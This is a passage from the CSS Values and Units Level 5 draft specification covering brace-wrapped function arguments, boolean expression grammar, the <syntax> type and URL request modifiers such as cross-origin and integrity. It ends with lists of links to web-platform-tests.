## 1. Introduction

**This is a diff spec against [CSS
Values and Units Level 4](https://www.w3.org/TR/css-values-4/).**

### 1.1. Module Interactions

This module extends
[\[CSS-VALUES-4\]](#biblio-css-values-4 "CSS Values and Units Module Level 4")
which replaces and extends the data type definitions in
[\[CSS21\]](#biblio-css21 "Cascading Style Sheets Level 2 Revision 1 (CSS 2.1) Specification")
sections [1.4.2.1](https://www.w3.org/TR/CSS21/about.html#value-defs),
[4.3](https://www.w3.org/TR/CSS21/syndata.html#values), and
[A.2](https://www.w3.org/TR/CSS21/aural.html#aural-intro).

## 2. Textual Data Types

See [CSS Values 4 § 4 Textual Data
Types](https://drafts.csswg.org/css-values-4/#textual-values).

## 3. Value Definition Syntax

See [CSS Values 4 § 2 Value Definition
Syntax](https://drafts.csswg.org/css-values-4/#value-defs).

Additionally,

1. Boolean combinations of a conditional notation. These are written
 using the
 [\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) notation, and represent recursive
 expressions of boolean logic using keywords and parentheses, applied
 to the grammar specified in brackets, e.g. [\<boolean-expr\[ (
 \&lt;media-feature\&gt; )
 \]\>](#typedef-boolean-expr) to express [media
 queries](https://drafts.csswg.org/mediaqueries-5/#media-query).

### 3.1. Functional Notation Definitions

See [CSS Values 4 § 2.6 Functional Notation
Definitions](https://drafts.csswg.org/css-values-4/#component-functions).

#### 3.1.1. Commas in Function Arguments

[Functional
notation](https://drafts.csswg.org/css-values-4/#functional-notation) often uses commas to separate parts of its internal
grammar, and occasionally other syntax (such as `:` or
`;` in [if()](#funcdef-if)). However, some functions (such as
[mix()](https://www.w3.org/TR/css-values-5/#funcdef-mix)) allow values that, themselves, could contain
these argument-separating tokens. These values (currently
[\<whole-value\>](#whole-value),
[\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value), and
[\<any-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-any-value)) are [free-form
productions].

To accommodate these sorts of grammars unambiguously, the [free-form
productions](#free-form-productions) can be optionally wrapped in curly braces . These
braces are syntactic, not part of the actual value, and only serve to
explicitly indicate the bounds of the production. A [free-form
production] can either (after optional
whitespace) start with a
[\<{-token\>](https://drafts.csswg.org/css-syntax-3/#tokendef-open-curly), or not:

If it does not start with a \"{\" token

: The production does not match any top-level commas or blocks.
 (The production stops parsing at that point, so the comma or
 block is matched by the next grammar term instead; probably the
 function's own argument-separating comma.) Individual usages of the
 production can define additional tokens that are similarly
 restricted from matching at the top-level.

If it does start with a \"{\" token

: The production matches just the block that the \"{\" token opens.
 It represents the *contents* of that block, ignoring the block
 wrapper itself.

 General restrictions defined for a particular
[free-form
production](#free-form-productions), like
[\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) not matching
[\<semicolon-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-semicolon-token)s, apply regardless of whether it's
-wrapped or not.

For example, the grammar of the
[random-item()](#funcdef-random-item) function is:

``` highlight
random-item( <random-key>, [<declaration-value>?]# )
```

The [\#] indicates comma-separated repetitions, so randomly
choosing between three keywords would be written as normal for
functions, like:

``` highlight
font-family: random-item(--x, serif, sans-serif, monospace);
```

However, sometimes the values you want to choose between need to include
commas. When this is the case, wrapping the values in allows their
commas to be distinguished from the function's argument-separating
commas:

``` highlight
font-family: random-item(--x, {Times, serif}, {Arial, sans-serif}, {Courier, monospace});
```

This randomly chooses one of three font-family lists: either [Times,
serif], or [Arial, sans-serif], or [Courier,
monospace].

This is not all-or-nothing; you can use around *some* arguments that
need it, while leaving others bare when they don't need it. You are also
allowed to use around a value when it's not strictly required. For
example:

``` highlight
font-family: random-item(--x, {Times, serif}, sans-serif, {monospace});
```

This represents choosing between three font-family lists: either [Times,
serif], or
[sans-serif](https://drafts.csswg.org/css-fonts-4/#valdef-font-family-sans-serif), or
[monospace](https://drafts.csswg.org/css-fonts-4/#valdef-font-family-monospace).

However, this -wrapping is *only* allowed for some function
arguments---​those defined as [free-form
productions](#free-form-productions). It's not valid for any other productions; if you use
 around other function arguments, it'll just fail to match the
function's grammar and become invalid. For example, the following is
**invalid**:

``` highlight
background-image: linear-gradient(to left, {red}, magenta);
```

 Because wrappers are allowed even when not
explicitly required, they can be used defensively around values when the
author isn't sure if they'll end up containing commas or not, due to
[arbitrary substitution
functions](#arbitrary-substitution-function) like
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var). For example, [font-family: random-item(\--x,
{var(\--list1)},
monospace)](https://drafts.csswg.org/css-fonts-4/#propdef-font-family) will work correctly regardless of whether the
[\--list1] custom property contains a comma-separated list or not.

[Functional
notations](https://drafts.csswg.org/css-values-4/#functional-notation) are serialized without wrappers whenever possible.

The following generic productions are [free-form
productions](#free-form-productions):

- [\<any-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-any-value)

- [\<whole-value\>](#whole-value)

- [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value)

For legacy compat reasons, the
[\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) defined for the fallback value of
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) is a [non-strict free-form
production]. It ignores the rules restricting what it can
contain when it does not start with a \"{\" token: it is allowed to
contain commas and blocks. It still follows the standard [free-form
production](#free-form-productions) rules when it *does* start with a \"{\" token, however:
the fallback is just the contents of the block, and doesn't include
the wrapper itself.

Other contexts *may* define that they use [non-strict free-form
productions](#non-strict-free-form-production), but it *should* be avoided unless necessary.

### [3.2. ][ Boolean Expression Multiplier [\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr)]
Several contexts (such as
[\@media](https://drafts.csswg.org/css-conditional-3/#at-ruledef-media),
[\@supports](https://drafts.csswg.org/css-conditional-3/#at-ruledef-supports), [if()](#funcdef-if), \...) specify conditions, and allow combining those
conditions with boolean logic (and/or/not/grouping). Because they use
the same non-trivial recursive syntax structure, the special
[[\<boolean-expr\>](#typedef-boolean-expr)] production represents this
pattern generically.

The
[\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) notation wraps another value type in
the square brackets within it, e.g. \<boolean\[ \<test\> \]\>, and
represents that value type alone as well as boolean combinations using
the
[not](https://drafts.csswg.org/mediaqueries-5/#valdef-media-not), [and], and [or] keywords and
grouping parenthesis. It is formally equivalent to:

```
<boolean-expr[ <test> ]> = not <boolean-expr-group> | <boolean-expr-group>
 [ [ and <boolean-expr-group> ]*
 | [ or <boolean-expr-group> ]* ]

<boolean-expr-group> = <test> | ( <boolean-expr[ <test> ]> ) | <general-enclosed>
```

The
[\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) production represents a true, false,
or unknown value. Its value is resolved using 3-value Kleene logic, with
top-level unknown values (those not directly nested inside the grammar
of another [\<boolean-expr\[\]\>]) resolving to false unless otherwise specified; see
[Appendix B: Boolean Logic](#boolean-logic) for details.

For example, the
[\@container](https://drafts.csswg.org/css-conditional-5/#at-ruledef-container) rule allows a wide variety of tests: including
size queries, style queries, and scroll-state queries. All of these are
arbitrarily combinable with boolean logic. Using
[\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr), the grammar for an
[\@container] query could be
written as:

```
<container-query> = <boolean-expr[ <cq-test> ]>
<cq-test> = (<size-query>) | style( <style-query> ) | scroll-state( <scroll-state-query> )
<size-query> = <boolean-expr[ ( <size-feature> ) ]> | <size-feature>
<style-query> = <boolean-expr[ ( <style-feature> ) ]> | <style-feature>
<scroll-state-query> = <boolean-expr[ ( <scroll-state-feature> ) ]> | <scroll-state-feature>
```

[\<general-enclosed\>](https://drafts.csswg.org/mediaqueries-5/#typedef-general-enclosed) branch of the logic allows for future
compatibility---​unless otherwise specified new expressions in an older
UA will be parsed and considered "unknown", rather than invalidating the
production. For consistency with that allowance, the [\<test\>]
term in a
[\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) should be defined to match
[\<general-enclosed\>].

### 3.3. Specifying CSS Syntax in CSS: the [\<syntax\> type]
Some features in CSS, such as the
[attr()](#funcdef-attr)
function or [registered custom
properties](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property), allow you to specify how *another* value is meant to
be parsed. This is declared via the
[\<syntax\>](#typedef-syntax) production, which resembles a limited form of the CSS
[value definition
syntax](https://drafts.csswg.org/css-values-4/#css-value-definition-syntax) used in specifications to define CSS features, and
which represents a [syntax
definition](https://drafts.css-houdini.org/css-properties-values-api-1/#syntax-definition):

```
<syntax> = '*' | <syntax-component> [ <syntax-combinator> <syntax-component> ]* | <syntax-string>
<syntax-component> = <syntax-single-component> <syntax-multiplier>?
 | '<' transform-list '>'
<syntax-single-component> = '<' <syntax-type-name> '>' | <ident>
<syntax-type-name> = angle | color | custom-ident | image | integer
 | length | length-percentage | number
 | percentage | resolution | string | time
 | url | transform-function
<syntax-combinator> = '|'
<syntax-multiplier> = [ '#' | '+' ]

<syntax-string> = <string>
```

A
[\<syntax-component\>](#typedef-syntax-component) consists of either a
[\<syntax-type-name\>](#typedef-syntax-type-name) between \<\> (angle brackets), which
maps to one of the [supported syntax component
names](https://drafts.css-houdini.org/css-properties-values-api-1/#css-supported-syntax-component-name), or an
[\<ident\>](https://drafts.csswg.org/css-values-4/#typedef-ident), which represents any
[keyword](https://drafts.csswg.org/css-values-4/#css-keyword). Additionally, a
[\<syntax-component\>]
may contain a
[multiplier](https://drafts.css-houdini.org/css-properties-values-api-1/#multipliers),
which indicates a
[list](https://infra.spec.whatwg.org/#list) of values.

 This means that `<length>` and
`length` are two different types: the former describes a
[\<length\>](https://drafts.csswg.org/css-values-4/#length-value), whereas the latter describes a
[keyword](https://drafts.csswg.org/css-values-4/#css-keyword) `length`.

Multiple
[\<syntax-component\>](#typedef-syntax-component)s may be
[combined](https://drafts.css-houdini.org/css-properties-values-api-1/#combinator)
with a `|`
[\<delim-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-delim-token), causing the syntax components to be
matched against a value in the specified order.

```
<percentage> | <number> | auto
```

The above, when parsed as a
[\<syntax\>](#typedef-syntax), would accept
[\<percentage\>](https://drafts.csswg.org/css-values-4/#percentage-value) values,
[\<number\>](https://drafts.csswg.org/css-values-4/#number-value) values, as well as the keyword
`auto`.

```
red | <color>
```

The [syntax
definition](https://drafts.css-houdini.org/css-properties-values-api-1/#syntax-definition) resulting from the above
[\<syntax\>](#typedef-syntax), when used as a grammar for
[parsing](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar), would match an input `red` as an
[identifier](https://drafts.csswg.org/css-values-4/#css-css-identifier), but would match an input `blue` as a
[\<color\>](https://drafts.csswg.org/css-color-5/#typedef-color).

The `*`
[\<delim-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-delim-token) represents the [universal syntax
definition](https://drafts.css-houdini.org/css-properties-values-api-1/#universal-syntax-definition).

The `<transform-list>` production is a convenience form
equivalent to `<transform-function>+`. [Note that
`<transform-list>` may not be followed by a
[\<syntax-multiplier\>](#typedef-syntax-multiplier).]

[Whitespace](https://drafts.csswg.org/css-syntax-3/#whitespace) is not allowed between the angle bracket
[\<delim-token\>](https://drafts.csswg.org/css-syntax-3/#typedef-delim-token)s (`<` `>`)
and the
[\<syntax-type-name\>](#typedef-syntax-type-name) they enclose, nor is
[whitespace] allowed to precede a
[\<syntax-multiplier\>](#typedef-syntax-multiplier).

 The
[whitespace](https://drafts.csswg.org/css-syntax-3/#whitespace) restrictions also apply to
`<transform-list>`.

A
[\<syntax-string\>](#typedef-syntax-string) is a
[\<string\>](https://drafts.csswg.org/css-values-4/#string-value) whose value successfully
[parses](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) as a
[\<syntax\>](#typedef-syntax), and represents the same value as that
[\<syntax\>] would.

[\<syntax-string\>](#typedef-syntax-string) mostly exists for historical
purposes; before [\<syntax\>](#typedef-syntax) was defined, the
[\@property](https://drafts.css-houdini.org/css-properties-values-api-1/#at-ruledef-property) rule used a
[\<string\>](https://drafts.csswg.org/css-values-4/#string-value) for this purpose.

#### 3.3.1. Parsing as [\<syntax\>]
The purpose of a [\<syntax\>](#typedef-syntax) is usually to specify how to parse
another value (such as the value of a [registered custom
property](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property), or an attribute value in
[attr()](#funcdef-attr)).
However, the generic [parse something according to a CSS
grammar](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) algorithm returns an unspecified internal structure,
since parse results might be ambiguous and need further massaging.

To avoid these issues and get a well-defined result, use [parse with a
\<syntax\>](#parse-with-a-syntax):

To [parse with a [\<syntax\>](#typedef-syntax)] given a
[string](https://infra.spec.whatwg.org/#string) or
[list](https://infra.spec.whatwg.org/#list) or [component
values](https://drafts.csswg.org/css-syntax-3/#component-value) `values`, a
[\<syntax\>](#typedef-syntax) value `syntax`, and optionally an element
`el` for context, perform the following steps. It returns
either CSS values, or the [guaranteed-invalid
value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

1. [Parse a list of component
 values](https://drafts.csswg.org/css-syntax-3/#parse-a-list-of-component-values) from `values`, and let
 `raw parse` be the result.

2. If `el` was given, [substitute arbitrary substitution
 functions](#substitute-arbitrary-substitution-function) in `raw parse`, and set
 `raw parse` to that result.

3. [parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) `values` according to
 `syntax`, with a
 [\*](https://drafts.csswg.org/selectors-3/#x) value treated as
 [`<declaration-value>`](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value)`?`, and let
 `parsed result` be the result. If `syntax`
 used a [\|] combinator, let `parsed result` be the
 parse result from the first matching clause.

4. If `parsed result` is failure, return the
 [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

5. Assert: `parsed result` is now a well-defined list of one
 or more CSS values, since each branch of a
 [\<syntax\>](#typedef-syntax) defines an unambiguous parse result
 (or the [\*](https://drafts.csswg.org/selectors-3/#x) syntax is unambiguous on its own).

6. Return `parsed result`.

 This algorithm does not resolved the parsed values into
[computed
values](https://drafts.csswg.org/css-cascade-5/#computed-value); the context in which the value is used will usually do
that already, but if not, the invoking algorithm will need to handle
that on its own.

## 4. Extensions to Level 4 Value Types

See [CSS Values and Units Level 4](https://www.w3.org/TR/css-values-4/).

### [4.1. ][ Resource Locators: the [\<url\>](https://drafts.csswg.org/css-values-4/#url-value) type]
See [CSS Values 4 § 4.5 Resource Locators: the \<url\>
type](https://drafts.csswg.org/css-values-4/#urls).

Tests

- [empty.html](https://wpt.fyi/results/css/css-values/urls/empty.html "css/css-values/urls/empty.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/empty.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/empty.html)
- [fragment-only.html](https://wpt.fyi/results/css/css-values/urls/fragment-only.html "css/css-values/urls/fragment-only.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/fragment-only.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/fragment-only.html)
- [resolve-relative-to-base.sub.html](https://wpt.fyi/results/css/css-values/urls/resolve-relative-to-base.sub.html "css/css-values/urls/resolve-relative-to-base.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/resolve-relative-to-base.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/resolve-relative-to-base.sub.html)
- [resolve-relative-to-stylesheet.html](https://wpt.fyi/results/css/css-values/urls/resolve-relative-to-stylesheet.html "css/css-values/urls/resolve-relative-to-stylesheet.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/resolve-relative-to-stylesheet.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/resolve-relative-to-stylesheet.html)
- [inline-cache-base-uri-cssom.html](https://wpt.fyi/results/css/css-values/inline-cache-base-uri-cssom.html "css/css-values/inline-cache-base-uri-cssom.html")
 [[(live
 test)]](http://wpt.live/css/css-values/inline-cache-base-uri-cssom.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/inline-cache-base-uri-cssom.html)
- [inline-cache-base-uri.html](https://wpt.fyi/results/css/css-values/inline-cache-base-uri.html "css/css-values/inline-cache-base-uri.html")
 [[(live
 test)]](http://wpt.live/css/css-values/inline-cache-base-uri.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/inline-cache-base-uri.html)

#### 4.1.1. Request URL Modifiers

[[\<request-url-modifier\>](#typedef-request-url-modifier)]s are
[\<url-modifier\>](https://drafts.csswg.org/css-values-4/#typedef-url-modifier)s that affect the
[\<url\>](https://drafts.csswg.org/css-values-4/#url-value)'s resource
[request](https://fetch.spec.whatwg.org/#concept-request) by applying associated [URL request modifier
steps](https://drafts.csswg.org/css-values-4/#url-request-modifier-steps). See [CSS Values 4 § 4.5.4 URL Processing
Model](https://drafts.csswg.org/css-values-4/#url-processing).

This specification defines the following
[\<request-url-modifier\>](#typedef-request-url-modifier)s:

```
<request-url-modifier> = <cross-origin-modifier> | <integrity-modifier> | <referrer-policy-modifier>
<cross-origin-modifier> = cross-origin(anonymous | use-credentials)
<integrity-modifier> = integrity(<string>)
<referrer-policy-modifier> = referrer-policy(no-referrer | no-referrer-when-downgrade | same-origin | origin | strict-origin | origin-when-cross-origin | strict-origin-when-cross-origin | unsafe-url)
```

[[\<cross-origin-modifier\>](#typedef-request-url-modifier-cross-origin-modifier)] = [cross-origin]([anonymous] \| [use-credentials])
: The [URL request modifier
 steps](https://drafts.csswg.org/css-values-4/#url-request-modifier-steps) for this modifier given
 [request](https://fetch.spec.whatwg.org/#concept-request) `req` are:
 1. Set `req`'s
 [mode](https://fetch.spec.whatwg.org/#concept-request-mode) to \"cors\".

 2. If the given value is
 [use-credentials](#valdef-request-url-modifier-use-credentials), set `req`'s [credentials
 mode](https://fetch.spec.whatwg.org/#concept-request-credentials-mode) to \"include\".

 3. Otherwise, set `req`'s [credentials
 mode](https://fetch.spec.whatwg.org/#concept-request-credentials-mode) to \"same-origin\".

[[\<integrity-modifier\>](#typedef-request-url-modifier-integrity-modifier)] = [integrity]([\<string\>](https://drafts.csswg.org/css-values-4/#string-value))
: The [URL request modifier
 steps](https://drafts.csswg.org/css-values-4/#url-request-modifier-steps) for this modifier given
 [request](https://fetch.spec.whatwg.org/#concept-request) `req` are to set
 [request]'s [integrity
 metadata](https://fetch.spec.whatwg.org/#concept-request-integrity-metadata) to the given
 [\<string\>](https://drafts.csswg.org/css-values-4/#string-value).

[[\<referrer-policy-modifier\>](#typedef-request-url-modifier-referrer-policy-modifier)] = [referrer-policy]([no-referrer] \| [no-referrer-when-downgrade] \| [same-origin] \| [origin] \| [strict-origin] \| [origin-when-cross-origin] \| [strict-origin-when-cross-origin] \| [unsafe-url])
: The [URL request modifier
 steps](https://drafts.csswg.org/css-values-4/#url-request-modifier-steps) for this modifier given
 [request](https://fetch.spec.whatwg.org/#concept-request) `req` are to set
 [request]'s [referrer
 policy](https://fetch.spec.whatwg.org/#concept-request-referrer-policy) to the
 [`ReferrerPolicy`](https://w3c.github.io/webappsec-referrer-policy/#enumdef-referrerpolicy) that matches the given value.

To [apply request modifiers from URL
value] given a
[request](https://fetch.spec.whatwg.org/#concept-request) `req` and a
[\<url\>](https://drafts.csswg.org/css-values-4/#url-value) `url`, call the [URL
request modifier
steps](https://drafts.csswg.org/css-values-4/#url-request-modifier-steps) for `url`'s
[\<request-url-modifier\>](#typedef-request-url-modifier)s in sequence given `req`.

- [url-font-cross-origin-anonymous-negative.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-font-cross-origin-anonymous-negative.sub.html "css/css-values/urls/cross-origin/url-font-cross-origin-anonymous-negative.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-font-cross-origin-anonymous-negative.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-font-cross-origin-anonymous-negative.sub.html)
- [url-font-cross-origin-anonymous.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-font-cross-origin-anonymous.sub.html "css/css-values/urls/cross-origin/url-font-cross-origin-anonymous.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-font-cross-origin-anonymous.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-font-cross-origin-anonymous.sub.html)
- [url-font-cross-origin-use-credentials-negative.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-font-cross-origin-use-credentials-negative.sub.html "css/css-values/urls/cross-origin/url-font-cross-origin-use-credentials-negative.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-font-cross-origin-use-credentials-negative.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-font-cross-origin-use-credentials-negative.sub.html)
- [url-font-cross-origin-use-credentials.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-font-cross-origin-use-credentials.sub.html "css/css-values/urls/cross-origin/url-font-cross-origin-use-credentials.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-font-cross-origin-use-credentials.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-font-cross-origin-use-credentials.sub.html)
- [url-image-cross-origin-anonymous-negative.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-image-cross-origin-anonymous-negative.sub.html "css/css-values/urls/cross-origin/url-image-cross-origin-anonymous-negative.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-image-cross-origin-anonymous-negative.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-image-cross-origin-anonymous-negative.sub.html)
- [url-image-cross-origin-anonymous.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-image-cross-origin-anonymous.sub.html "css/css-values/urls/cross-origin/url-image-cross-origin-anonymous.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-image-cross-origin-anonymous.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-image-cross-origin-anonymous.sub.html)
- [url-image-cross-origin-use-credentials-negative.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-image-cross-origin-use-credentials-negative.sub.html "css/css-values/urls/cross-origin/url-image-cross-origin-use-credentials-negative.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-image-cross-origin-use-credentials-negative.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-image-cross-origin-use-credentials-negative.sub.html)
- [url-image-cross-origin-use-credentials.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-image-cross-origin-use-credentials.sub.html "css/css-values/urls/cross-origin/url-image-cross-origin-use-credentials.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-image-cross-origin-use-credentials.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-image-cross-origin-use-credentials.sub.html)
- [url-image-set-cross-origin-anonymous-negative.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-image-set-cross-origin-anonymous-negative.sub.html "css/css-values/urls/cross-origin/url-image-set-cross-origin-anonymous-negative.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-image-set-cross-origin-anonymous-negative.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-image-set-cross-origin-anonymous-negative.sub.html)
- [url-image-set-cross-origin-anonymous.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-image-set-cross-origin-anonymous.sub.html "css/css-values/urls/cross-origin/url-image-set-cross-origin-anonymous.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-image-set-cross-origin-anonymous.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-image-set-cross-origin-anonymous.sub.html)
- [url-import-cross-origin-anonymous-negative.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-import-cross-origin-anonymous-negative.sub.html "css/css-values/urls/cross-origin/url-import-cross-origin-anonymous-negative.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-import-cross-origin-anonymous-negative.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-import-cross-origin-anonymous-negative.sub.html)
- [url-import-cross-origin-anonymous.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-import-cross-origin-anonymous.sub.html "css/css-values/urls/cross-origin/url-import-cross-origin-anonymous.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-import-cross-origin-anonymous.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-import-cross-origin-anonymous.sub.html)
- [url-import-cross-origin-use-credentials-negative.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-import-cross-origin-use-credentials-negative.sub.html "css/css-values/urls/cross-origin/url-import-cross-origin-use-credentials-negative.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-import-cross-origin-use-credentials-negative.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-import-cross-origin-use-credentials-negative.sub.html)
- [url-import-cross-origin-use-credentials.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-import-cross-origin-use-credentials.sub.html "css/css-values/urls/cross-origin/url-import-cross-origin-use-credentials.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-import-cross-origin-use-credentials.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-import-cross-origin-use-credentials.sub.html)
- [url-svg-filter-cross-origin-anonymous-negative.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-svg-filter-cross-origin-anonymous-negative.sub.html "css/css-values/urls/cross-origin/url-svg-filter-cross-origin-anonymous-negative.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-svg-filter-cross-origin-anonymous-negative.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-svg-filter-cross-origin-anonymous-negative.sub.html)
- [url-svg-filter-cross-origin-anonymous.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-svg-filter-cross-origin-anonymous.sub.html "css/css-values/urls/cross-origin/url-svg-filter-cross-origin-anonymous.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-svg-filter-cross-origin-anonymous.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-svg-filter-cross-origin-anonymous.sub.html)
- [url-svg-filter-cross-origin-use-credentials-negative.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-svg-filter-cross-origin-use-credentials-negative.sub.html "css/css-values/urls/cross-origin/url-svg-filter-cross-origin-use-credentials-negative.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-svg-filter-cross-origin-use-credentials-negative.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-svg-filter-cross-origin-use-credentials-negative.sub.html)
- [url-svg-filter-cross-origin-use-credentials.sub.html](https://wpt.fyi/results/css/css-values/urls/cross-origin/url-svg-filter-cross-origin-use-credentials.sub.html "css/css-values/urls/cross-origin/url-svg-filter-cross-origin-use-credentials.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/cross-origin/url-svg-filter-cross-origin-use-credentials.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/cross-origin/url-svg-filter-cross-origin-use-credentials.sub.html)
- [url-font-integrity-negative.sub.html](https://wpt.fyi/results/css/css-values/urls/integrity/url-font-integrity-negative.sub.html "css/css-values/urls/integrity/url-font-integrity-negative.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/integrity/url-font-integrity-negative.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/integrity/url-font-integrity-negative.sub.html)
- [url-font-integrity.sub.html](https://wpt.fyi/results/css/css-values/urls/integrity/url-font-integrity.sub.html "css/css-values/urls/integrity/url-font-integrity.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/integrity/url-font-integrity.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/integrity/url-font-integrity.sub.html)
- [url-image-integrity-negative.sub.html](https://wpt.fyi/results/css/css-values/urls/integrity/url-image-integrity-negative.sub.html "css/css-values/urls/integrity/url-image-integrity-negative.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/integrity/url-image-integrity-negative.sub.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/urls/integrity/url-image-integrity-negative.sub.html)
- [url-image-integrity.sub.html](https://wpt.fyi/results/css/css-values/urls/integrity/url-image-integrity.sub.html "css/css-values/urls/integrity/url-image-integrity.sub.html")
 [[(live
 test)]](http://wpt.live/css/css-values/urls/integrity/url-image-integrity.sub.html)
